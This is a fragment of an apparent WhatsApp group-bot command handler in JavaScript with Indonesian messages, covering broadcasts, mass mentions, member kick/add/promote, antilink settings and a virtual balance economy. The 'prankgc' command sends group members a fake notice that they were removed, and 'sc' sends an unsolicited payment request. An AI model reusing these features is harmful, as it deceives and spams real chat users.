                   conn.sendMessage(from, { delete: { fromMe: false, id: quotedMsg.id, remoteJid: from }})
                   break
            case 'bcgc':
            case 'bcgroup': {
                if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}bcgc* teks`)
                let getGroups = await conn.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${q}`
                conn.sendMessage(i, {
                    text: a, contextInfo: {
                      externalAdReply: {'showAdAttribution': !![],
                        title: `Broadcast by ${ownerName}`,
	                    body: botName,
	                    thumbnail: fs.readFileSync(pathimg1),
	                    sourceUrl: hmm.linkmenu,
                        mediaType: 289,
                        renderLargerThumbnail: false
                      }
                    }
                  }, { quoted: msg })
                }
                reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'sc':
            case 'script':
            case 'scriptbot':
                let uy = `Script Ini tidak dijual\nScript akan terus dikembangkan oleh ${ownerName}`
                conn.relayMessage(from,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'IDR',
                          amount1000: '50000',
                          requestFrom: creatorNumber,
                          noteMessage: {
                             extendedTextMessage: {
                                text: uy,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                break
		    case 'tagall': case 'infoall':
                if (!isGroup) return reply(mess.OnlyGrup)
		        if (!isGroupAdmins) return reply(mess.GrupAdmin)
		        let participants = msg.isGroup ? await groupMetadata.participants : ''
                let tekss = `*👤 TAG ALL 👤*\n\n*Pesan : ${q ? q : 'Nothing'}*\n\n`
                for (let mem of participants) {
                  tekss += `• @${mem.id.split('@')[0]}\n`
                }
                conn.sendMessage(from, { text: tekss, mentions: participants.map(a => a.id) }, { quoted: msg })
                break
            case 'kick':
                if (!isGroup) return reply(mess.OnlyGrup)
                   if (!isGroupAdmins && !isOwner && !isCreator) return reply(mess.GrupAdmin)
                   if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                   if (args.length < 2) return reply(`Kirim Perintah ${command} 628`)
                let blockwww = m.mentionedJid ? m.mentionedJid : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(from, [blockwww], 'remove')
                .then( res => {
				  var teks = `Sukses kick ${q} 
di grup ${groupName}`
                conn.sendMessage(from, {
                    text: teks, mentions: [q.replace(/[^0-9]/g, '') + '@s.whatsapp.net']
                      }, { quoted: msg })
				}).catch(() => reply(mess.error.api))
                break
            case 'prankgc':
			    var anu = `${pushname} mengeluarkan Anda
`
			conn.relayMessage(from, {
                        scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: 1200,
                        title: anu
                        }
                    }, { quoted: msg })
				break
            case 'add':
                if (!isGroup) return reply(mess.OnlyGrup)
                   if (!isGroupAdmins && !isOwner && !isCreator) return reply(mess.GrupAdmin)
                   if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                   if (args.length < 2) return reply(`Kirim Perintah ${command} 628`)
                let blockwwww = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(from, [blockwwww], 'add')
                .then( res => {
				  var teks = `Sukses add @${q} 
di grup ${groupName}`
                conn.sendMessage(from, {
                    text: teks, mentions: [q.replace(/[^0-9]/g, '') + '@s.whatsapp.net']
                      }, { quoted: msg })
				}).catch(() => reply(mess.error.api))
                break
            case 'promote': case 'pm':
                   if (!isGroup) return reply(mess.OnlyGrup)
                   if (!isGroupAdmins) return reply(mess.GrupAdmin)
                   if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                   if (mentionUser.length !== 0) {
                     conn.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
                     .then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
                     .catch(() => reply(mess.error.api))
                   } else if (isQuotedMsg) {
                     conn.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
                     .then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
                     .catch(() => reply(mess.error.api))
                   } else {
                     reply(`Tag atau balas pesan member yang ingin dijadikan admin`)
                   }
                   break
                case 'demote':
                   if (!isGroup) return reply(mess.OnlyGrup)
                   if (!isGroupAdmins) return reply(mess.GrupAdmin)
                   if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                   if (mentionUser.length !== 0) {
                     conn.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
                     .then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
                     .catch(() => reply(mess.error.api))
                   } else if (isQuotedMsg) {
                     conn.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
                     .then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
                     .catch(() => reply(mess.error.api))
                   } else {
                     reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa`)
                   }
                   break
			case 'hidetag':
		        if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins && !isOwner && !isCreator) return reply(mess.GrupAdmin)
			    let mem = [];
		        groupMembers.map( i => mem.push(i.id) )
				conn.sendMessage(from, { text: q ? q : '', mentions: mem })
			    break
			case 'antilink':
                   if (!isGroup) return reply(mess.OnlyGrup)
                   if (!isGroupAdmins && !isOwner && !isCreator) return reply(mess.GrupAdmin)
                   if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                   if (args.length === 1) return reply(`Pilih enable atau disable`)
                   if (args[1].toLowerCase() === 'enable') {
                     if (isAntiLink) return reply(`Udah aktif`)
                     antilink.push(from)
                     fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                     reply('Antilink grup aktif')
                   } else if (args[1].toLowerCase() === 'disable') {
                     if (!isAntiLink) return reply(`Udah nonaktif`)
                     let anu = antilink.indexOf(from)
                     antilink.splice(anu, 1)
                     fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                     reply('Antilink grup nonaktif')
                   } else {
                     reply(`Pilih enable atau disable`)
                   }
                   break
             case 'messagegroup':
             case 'msggroup':
             case 'notificationgc':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner && !isCreator) return reply(mess.GrupAdmin)
                if (args.length < 2) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === "enable") {
                   if (notificationgroup) return reply(`Notification Group sudah aktif`)
                   notifigroup.push(from)
                   fs.writeFileSync('./database/welcome.json', JSON.stringify(notifigroup, null, 2))
                   reply(`Sukses mengaktifkan Notification Group di grup ini`)
                } else if (args[1].toLowerCase() === "disable") {
                   if (!notificationgroup) return reply(`Notification Group sudah nonaktif`)
                   var posi = notifigroup.indexOf(from)
                   notifigroup.splice(posi, 1)
                   fs.writeFileSync('./database/welcome.json', JSON.stringify(notifigroup, null, 2))
                   reply(`Sukses menonaktifkan Notification Group di grup ini`)
                } else {
                   reply(`Pilih enable atau disable`)
                }
                break
			// Bank & Payment Menu
			case 'topbalance':{
                balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
                let top = '*── 「 TOP BALANCE 」 ──*\n\n'
                let arrTop = []
				var total = 10
				if (balance.length < 10) total = balance.length
                for (let i = 0; i < total; i ++){
                    top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
                    arrTop.push(balance[i].id)
                }
                mentions(top, arrTop, true)
            }
                break
            case 'buylimit':{
                if (args.length < 2) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $150 balance`)
                if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
                if (isNaN(args[1])) return reply(`Harus berupa angka`)
                if (args[1].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                let ane = Number(parseInt(args[1]) * 150)
                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                kurangBalance(sender, ane, balance)
                giveLimit(sender, parseInt(args[1]), limit)
                reply(monospace(`Pembeliaan limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
            }
                break
			case 'transfer':
            case 'tf':{
                 if (args.length < 2) return reply(`Kirim perintah *${command}* @tag nominal\nContoh : ${command} @0 2000`)
                 if (mentioned.length == 0) return reply(`Tag orang yang ingin di transfer balance`)
                 if (!args[2]) return reply(`Masukkan nominal nya!`)
                 if (isNaN(args[2])) return reply(`Nominal harus berupa angka!`)
                 if (args[2].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                 if (args[2].includes("-")) return reply(`Jangan menggunakan -`)
                 var anu = getBalance(sender, balance)
                 if (anu < args[2] || anu == 'undefined') return reply(`Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar $${args[2]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
                 kurangBalance(sender, parseInt(args[2]), balance)
                 addBalance(mentioned[0], parseInt(args[2]), balance)
                 reply(`Sukses transfer balance sebesar $${args[2]} kepada @${mentioned[0].split("@")[0]}`)
            }
                 break
            case 'buygamelimit':
            case 'buyglimit':{
                if (args.length < 2) return reply(`Kirim perintah *${prefix}buyglimit* jumlah game limit yang ingin dibeli\n\nHarga 1 game limit = $150 balance\nPajak $1 / $10`)
                if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
                if (isNaN(args[1])) return reply(`Harus berupa angka`)
                if (args[1].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                let ane = Number(parseInt(args[1]) * 150)
                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                kurangBalance(sender, ane, balance)
                givegame(sender, parseInt(args[1]), glimit)
                reply(monospace(`Pembeliaan game limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`))
            }
                break
			case 'limit': case 'balance':
			case 'ceklimit': case 'cekbalance':
			    if (mentioned.length !== 0){
					var Ystatus = ownerNumber.includes(mentioned[0])
					var isPrim = Ystatus ? true : _prem.checkPremiumUser(mentioned[0], premium)
				    var ggcount = isPrim ? gcounti.prem : gcounti.user
                    var limitMen = `${getLimit(mentioned[0], limitCount, limit)}`
                    reply(`Limit : ${_prem.checkPremiumUser(mentioned[0], premium) ? 'Unlimited' : limitMen}/${limitCount}\nLimit Game : ${cekGLimit(mentioned[0], ggcount, glimit)}/${ggcount}\nBalance : $${getBalance(mentioned[0], balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                } else {
                    var limitPrib = `${getLimit(sender, limitCount, limit)}/${limitCount}`
                    reply(`Limit : ${isPremium ? 'Unlimited' : limitPrib}\nLimit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : $${getBalance(sender, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                }
				break
			default:
		  }
		} catch(e) {
		 console.log(e)
		}
     }
